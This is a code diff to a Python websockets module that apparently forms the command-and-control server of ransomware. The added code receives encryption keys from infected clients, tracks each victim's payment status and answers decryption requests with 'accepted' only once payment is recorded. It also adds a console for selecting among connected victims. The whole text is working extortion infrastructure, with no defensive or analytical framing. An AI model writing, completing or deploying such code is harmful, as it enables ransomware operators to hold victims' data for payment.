@@ -1,6 +1,8 @@
 import websockets
 import asyncio 
 from enum import Enum
+import json
+
 class ConnectionState(Enum):
     CONNECTED = 1 # Connection established with the c2server
     IDENTIFIED = 2 # Envcheck done and username set
@@ -23,6 +25,7 @@ class Connection:
         self.state: ConnectionState = ConnectionState.CONNECTED
         self.__key = None
         self.is_paid = False
+        self.__selected_client = None
 
 
     def set_username(self, username):
@@ -40,6 +43,9 @@ class Connection:
     def set_payment_status(self, status: bool):
         self.is_paid = status
 
+    def set_selected_client(self, client:str):
+        self.__selected_client = client 
+
     async def send_message(self, message):
         await self.websocket.send(message)
 
@@ -47,10 +53,32 @@ class Connection:
         """Start listening and managing messages from the client."""
         try:
             async for message in self.websocket:
-                #TODO: remove this line in the future
                 print(f"[{self.username}] {message}")
+                data = json.loads(message)
+                match data.get("type"):
+                    case "crypto_rep":
+                        self.change_state(ConnectionState.CRYPTOGRAPHIC_SETUP)
+                        self.set_key(data.get("data", {}).get("key", None))
+                    case "decryption_req":
+                        self.change_state(ConnectionState.DECRYPTION_REQUESTED)
+                        await self.__send_decryption_rep()
+                    case "decryption_res":
+                        self.change_state(ConnectionState.DECRYPTED)
+                    case _:
+                        print(f"[{self.username}] Unknown message type: {data.get('type')}")
+                print(f"CLI({self.__selected_client})> ", end='', flush=True)
+
         except websockets.exceptions.ConnectionClosed:
             print("Connection closed by the client.")
+
+    async def __send_decryption_rep(self):
+        reply = {
+            "type": "decryption_rep",
+            "data": {
+                "status": "accepted" if self.is_paid else "rejected",
+            }
+        }
+        await self.send_message(json.dumps(reply))
 
     def show_info(self):
         print(f"Connection info:\n- URI: {self.uri}\n- Username: {self.username}\n- State: {self.state.name}\n- Paid: {self.is_paid}\n- Key: {self.__key}")
